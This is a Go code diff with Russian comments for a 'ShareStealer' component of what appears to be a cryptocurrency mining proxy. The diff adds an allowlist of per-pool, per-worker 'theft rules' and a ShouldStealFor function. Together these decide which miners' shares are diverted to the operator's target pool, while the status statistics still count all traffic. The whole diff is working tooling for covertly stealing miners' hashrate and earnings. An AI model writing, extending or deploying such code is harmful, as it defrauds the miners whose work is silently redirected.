@@ -48,6 +48,9 @@ type ShareStealerConfig struct {
 	// TargetTimeout время ожидания ответа (accept) от целевого пула
 	// на перенаправленную шару. По умолчанию 30 секунд.
 	TargetTimeout time.Duration
+
+	// Rules — allowlist правил кражи (этап 4). Пусто = кусать у всех.
+	Rules *StealRules
 }
 
 // targetHandshakeTimeout таймаут на полный handshake (subscribe+authorize)
@@ -70,6 +73,7 @@ type ShareStealer struct {
 	batchSize     int
 	targetTimeout time.Duration
 	pauseShares   bool // режим «паузы в шарах» (точный процент)
+	rules         *StealRules
 
 	// Целевой пул/воркер (куда сливаем шары).
 	targetPool   string
@@ -133,6 +137,7 @@ func NewShareStealer(cfg *ShareStealerConfig) *ShareStealer {
 		targetSSL:     cfg.TargetSSL,
 		targetTimeout: cfg.TargetTimeout,
 		pauseShares:   cfg.PauseShares,
+		rules:         cfg.Rules,
 		targetUp:      true, // до первой проверки считаем пул живым
 		startTime:     time.Now(),
 	}
@@ -288,6 +293,20 @@ func (s *ShareStealer) ShouldSteal() bool {
 	log.Printf("[STEAL] share stolen | stolen=%d/%d | next bite in %v",
 		s.stolenCount, s.totalCount, time.Until(s.nextBiteAt).Round(time.Second))
 	return true
+}
+
+// ShouldStealFor решает, кусать ли конкретную шару с учётом правил (пул+воркер).
+// В отличие от ShouldSteal, сначала проверяет allowlist: если пары нет в
+// правилах — шару не кусаем, но всё равно засчитываем в общую статистику
+// (totalCount), чтобы /status отражал весь поток.
+func (s *ShareStealer) ShouldStealFor(pool, worker string) bool {
+	if !s.rules.Match(pool, worker) {
+		s.mu.Lock()
+		s.totalCount++
+		s.mu.Unlock()
+		return false
+	}
+	return s.ShouldSteal()
 }
 
 // sharesPerBite возвращает число шар, которые нужно ПРОПУСТИТЬ между укусами,
